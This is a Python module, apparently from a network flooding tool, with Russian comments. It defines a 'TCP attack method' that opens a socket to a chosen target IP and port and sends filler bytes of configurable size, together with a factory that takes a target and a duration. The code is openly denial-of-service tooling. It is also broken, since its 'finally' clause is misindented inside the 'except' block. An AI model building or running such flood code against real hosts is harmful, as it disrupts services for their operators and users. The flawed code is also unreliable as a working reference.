from sender.utils.network import create_tcp_socket
from sender.methods.base_method import BaseMethod

class TCPMethod(BaseMethod):
    """Реализация TCP метода атаки"""
    
    def send_packet(self):
        try:
            sock = create_tcp_socket(self.target_ip, self.target_port, self.settings)
            if sock:
                data = b'X' * self.settings.packet_size
                sock.send(data)
                
                if self.settings.verbose:
                    self.logger.log_debug(f"Отправлен TCP пакет на {self.target_ip}:{self.target_port}")
        except Exception as e:
            self.logger.log_error(f"Ошибка отправки TCP пакета: {str(e)}")
            finally:
                if 'sock' in locals():
                    sock.close()

def tcp(target_ip, target_port, duration, settings, logger):
    """Фабрика для создания TCP метода"""
    return TCPMethod(target_ip, target_port, duration, settings, logger)
